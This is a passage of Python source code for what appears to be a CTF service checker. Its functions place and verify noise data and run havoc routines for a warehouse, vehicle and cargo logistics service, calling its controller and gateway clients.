    await state.set("cargo_count", cargo_count)

    if randbool(0.1):
        await controller.exit()


@checker.getnoise(0)
async def getnoise_warehouse_cargo(
    state: DataclassChainDB, controller: ControllerClient
):
    try:
        warehouse = await state.get("warehouse", Warehouse)
        expected = [
            await state.get(f"cargo{x}", Cargo)
            for x in range(await state.get("cargo_count"))
        ]
    except KeyError:
        raise MumbleException("Noise was not placed in previous tick") from None

    await controller.manage_warehouse(warehouse.name, warehouse.password)
    check_expected_cargo_list(
        await controller.list_cargo(), expected, check_destination=False
    )

    if randbool(0.1):
        await controller.exit()


@checker.putnoise(1)
async def putnoise_vehichle_cargo(
    state: DataclassChainDB, controller: ControllerClient, gateway: GatewayClient
):
    warehouse: Warehouse | None = None
    vehichle: Vehichle | None = None
    cargoes: list[Cargo] = []

    async def register_warehouse():
        nonlocal warehouse
        if vehichle is None:
            warehouse = await controller.register_random_warehouse()
        else:
            warehouse = await controller.register_random_warehouse(
                near=vehichle.location
            )

    async def register_vehichle():
        nonlocal vehichle
        if warehouse is None:
            vehichle = await controller.register_random_vehichle()
        else:
            vehichle = await controller.register_random_vehichle(
                near=warehouse.location
            )

    async def register_cargo():
        assert warehouse is not None
        cargoes.append(await controller.register_random_cargo())

    cargo_count = random.randint(2, 4)
    ops: list[Callable[[], CoroutineType]] = [register_vehichle] + [
        register_cargo
    ] * cargo_count
    random.shuffle(ops)
    ops.insert(random.randint(0, ops.index(register_cargo)), register_warehouse)
    for op in ops:
        await op()

    # `cast()` because type checker otherwise consider following code
    # unreachable as it thinks that variables are allways `None` and
    # so it thinks that `assert`s fail.
    warehouse = cast(Warehouse, warehouse)
    vehichle = cast(Vehichle, vehichle)
    assert warehouse is not None
    assert vehichle is not None
    assert len(cargoes) == cargo_count

    key = await controller.get_gateway_key()
    await gateway.location_update(vehichle.number, key, warehouse.location)

    random.shuffle(cargoes)
    for cargo in cargoes:
        await controller.load_cargo(cargo.id)

    vehichle.location = warehouse.location.random_near_point()
    await gateway.location_update(vehichle.number, key, vehichle.location)

    if randbool(0.1):
        await controller.exit()

    await state.set("vehichle", vehichle)
    for i, cargo in enumerate(cargoes):
        await state.set(f"cargo{i}", cargo)
    await state.set("cargo_count", cargo_count)


@checker.getnoise(1)
async def getnoise_vehichle_cargo(
    state: DataclassChainDB, controller: ControllerClient, gateway: GatewayClient
):
    try:
        vehichle = await state.get("vehichle", Vehichle)
        expected = [
            await state.get(f"cargo{x}", Cargo)
            for x in range(await state.get("cargo_count"))
        ]
    except KeyError:
        raise MumbleException("Noise was not placed in previous tick") from None

    autenticated_check = randbool()
    if autenticated_check:
        await controller.manage_vehichle(vehichle.number, vehichle.password)
        key = await controller.get_gateway_key()
        location, cargo_list = await gateway.get_status(vehichle.number, key)
        if randbool(0.1):
            await controller.exit()
    else:
        location, cargo_list = await gateway.get_status(vehichle.number, "")

    check_eq(location, vehichle.location, "Vehichle moved without location update")
    check_expected_cargo_list(cargo_list, expected, check_note=autenticated_check)


@checker.putnoise(2)
async def putnoise_transported_cargo(
    task: PutnoiseCheckerTaskMessage,
    log: LoggerAdapter,
    state: DataclassChainDB,
    gateway: GatewayClient,
):
    _controller0: ControllerClient | None = None
    _controller1: ControllerClient | None = None

    async def controller0() -> ControllerClient:
        nonlocal _controller0
        if _controller0 is None:
            _controller0 = await ControllerClient.from_checker_task(task, log)
        return _controller0

    async def controller1() -> ControllerClient:
        nonlocal _controller1
        if _controller1 is None:
            _controller1 = await ControllerClient.from_checker_task(task, log)
        return _controller1

    warehouse_origin: Warehouse | None = None
    warehouse_destination: Warehouse | None = None
    vehichle: Vehichle | None = None
    key: str | None = None
    cargoes: list[Cargo] = []

    central_location = random_location()

    async def register_warehouse_origin():
        nonlocal warehouse_origin
        warehouse_origin = await (await controller0()).register_random_warehouse(
            near=central_location
        )

    async def register_warehouse_destination():
        nonlocal warehouse_destination
        warehouse_destination = await (await controller1()).register_random_warehouse(
            near=central_location
        )

    async def register_vehichle():
        nonlocal vehichle
        vehichle = await (await controller0()).register_random_vehichle(
            near=central_location
        )

    async def move_vehichle():
        nonlocal key
        assert warehouse_origin is not None
        assert vehichle is not None
        key = await (await controller0()).get_gateway_key()
        await gateway.location_update(vehichle.number, key, warehouse_origin.location)

    async def register_cargo():
        assert warehouse_origin is not None
        assert warehouse_destination is not None
        cargoes.append(
            await (await controller0()).register_random_cargo(
                destination=warehouse_destination.name
            )
        )

    async def manage_vehichle_in_second_controller():
        assert vehichle is not None
        assert warehouse_destination is not None
        await (await controller1()).manage_vehichle(vehichle.number, vehichle.password)

    # I could spent X hours writing some "dependecy checks framework"... or I could do this :)
    cargo_count = random.randint(1, 3)
    ops: list[Callable[[], CoroutineType]] = [
        register_vehichle,
        register_warehouse_origin,
        register_warehouse_destination,
    ]
    random.shuffle(ops)
    for _ in range(cargo_count):
        ops.insert(
            random.randint(
                max(
                    ops.index(register_warehouse_origin),
                    ops.index(register_warehouse_destination),
                )
                + 1,
                len(ops),
            ),
            register_cargo,
        )
    ops.insert(
        random.randint(
            max(ops.index(register_warehouse_destination), ops.index(register_vehichle))
            + 1,
            len(ops),
        ),
        manage_vehichle_in_second_controller,
    )
    ops.insert(
        random.randint(
            max(ops.index(register_warehouse_origin), ops.index(register_vehichle)) + 1,
            len(ops),
        ),
        move_vehichle,
    )
    log.debug("Order of checks: %s", ", ".join(x.__name__ for x in ops))
    for op in ops:
        await op()

    # `cast()` because type checker otherwise consider following code
    # unreachable as it thinks that variables are allways `None` and
    # so it thinks that `assert`s fail.
    warehouse_origin = cast(Warehouse, warehouse_origin)
    warehouse_destination = cast(Warehouse, warehouse_destination)
    vehichle = cast(Vehichle, vehichle)
    key = cast(str, key)
    assert warehouse_origin is not None
    assert warehouse_destination is not None
    assert vehichle is not None
    assert key is not None
    assert len(cargoes) == cargo_count

    random.shuffle(cargoes)
    for cargo in cargoes:
        await (await controller0()).load_cargo(cargo.id)

    check_eq(
        len(await (await controller0()).list_cargo()),
        0,
        "Warehouse has extra cargo items",
    )

    if randbool():
        key = await (await controller1()).get_gateway_key()

    if randbool(0.1):
        await (await controller0()).exit()

    for location in make_random_path(
        warehouse_origin.location, warehouse_destination.location
    )[1:]:
        await gateway.location_update(vehichle.number, key, location)
    vehichle.location = warehouse_destination.location

    random.shuffle(cargoes)
    for cargo in cargoes:
        await (await controller1()).unload_cargo(cargo.id)

    if randbool(0.1):
        await (await controller1()).exit()

    await state.set("origin_warehouse", warehouse_origin.name)
    await state.set("vehichle", vehichle)
    await state.set("warehouse", warehouse_destination)
    for i, cargo in enumerate(cargoes):
        await state.set(f"cargo{i}", cargo)
    await state.set("cargo_count", cargo_count)


@checker.getnoise(2)
async def getnoise_transported_cargo(
    state: DataclassChainDB, controller: ControllerClient, gateway: GatewayClient
):
    try:
        warehouse = await state.get("warehouse", Warehouse)
        origin_warehouse = await state.get("origin_warehouse")
        vehichle = await state.get("vehichle", Vehichle)
        expected = [
            await state.get(f"cargo{x}", Cargo)
            for x in range(await state.get("cargo_count"))
        ]
    except KeyError:
        raise MumbleException("Noise was not placed in previous tick") from None

    await controller.manage_warehouse(warehouse.name, warehouse.password)

    async def check_log():
        log = await controller.read_log()
        if len(log) < len(expected) + 1:
            fail(
                "Some log entries are missing",
                f"Expected {len(expected) + 1} entries in log but got {len(log)}",
            )
        if len(log) > len(expected) + 1:
            fail(
                "Log has extra entries",
                f"Expected {len(expected) + 1} entries in log  but got {len(log)}",
            )

        check_in(
            log[0], "Warehouse registered", 'Missing "Warehouse registered" log entry'
        )
        for log_entry, cargo in zip(log[1:], expected):
            check_in(
                log_entry,
                str(vehichle.number),
                "'Cargo delivered' log entry is missing vehichle number",
            )
            check_in(
                log_entry,
                cargo.id,
                "'Cargo delivered' log entry is missing cargo ID (or logs are out of order)",
            )
            check_in(
                log_entry,
                origin_warehouse,
                "'Cargo delivered' log entry is origin warehouse (or logs are out of order)",
            )
            check_in(
                log_entry,
                cargo.note,
                "'Cargo delivered' log entry is missing cargo note (or logs are out of order)",
            )

    async def check_warehouse_cargo_list():
        check_expected_cargo_list(
            await controller.list_cargo(), expected, check_destination=False
        )

    async def check_vehichle():
        location, cargo_list = await gateway.get_status(vehichle.number, "")
        check_eq(location, vehichle.location, "Vehichle moved without location update")
        check_eq(len(cargo_list), 0, "Extra cargo items loaded in vehichle")

    ops: list[Callable[[], CoroutineType]] = [
        check_log,
        check_warehouse_cargo_list,
        check_vehichle,
    ]
    random.shuffle(ops)
    controller.log.debug("Order of checks: %s", ", ".join(x.__name__ for x in ops))
    for op in ops:
        await op()

    if randbool(0.1):
        await controller.exit()


@checker.havoc(0)
async def havoc_random_vehichle(client: ControllerClient, gateway: GatewayClient):
    vehichle = await client.register_random_vehichle()
    gateway_key = await client.get_gateway_key()
    for location in make_random_path(
        vehichle.location, vehichle.location.random_near_point(200, 50)
    )[1:]:
        await gateway.location_update(
            vehichle.number, gateway_key, location.random_near_point(3, 0)
        )
    if randbool():
        await gateway.get_status(vehichle.number, gateway_key if randbool() else "")


@checker.havoc(1)
async def havoc_random_warehouse(client: ControllerClient):
    await client.register_random_warehouse()
    expected: list[Cargo] = []

    async def check_cargo_list():
        nonlocal did_cargo_list_check
        did_cargo_list_check = True
        check_expected_cargo_list(
            await client.list_cargo(), expected, check_destination=False
        )

    async def check_log():
        nonlocal did_log_check
        did_log_check = True
        log = await client.read_log()
        check_eq(len(log), 1, "Expected exactly one log entry")
        check_in(
            log[0], "Warehouse registered", 'Missing "Warehouse registered" log entry'
        )

    did_log_check = False
    for _ in range(random.randint(1, 4)):
        did_cargo_list_check = False
        expected.append(await client.register_random_cargo())

        checks: list[CoroutineType] = []
        if randbool(0.3):
            checks.append(check_log())
        if randbool(0.2):
            checks.append(check_cargo_list())
        random.shuffle(checks)
        for check in checks:
            await check

    if not did_log_check:
        await check_log()
    if not did_cargo_list_check:
        await check_cargo_list()


# TODO: Feedback - Logging of exception messages is inconsistent...
# Sometimes it logs as an INFO level, sometimes as an ERROR level.
# IMHO most of them should be an ERROR level.
# (Especially e.g. `MumbledException.log_message`)

if __name__ == "__main__":
    checker.run(port=1337)
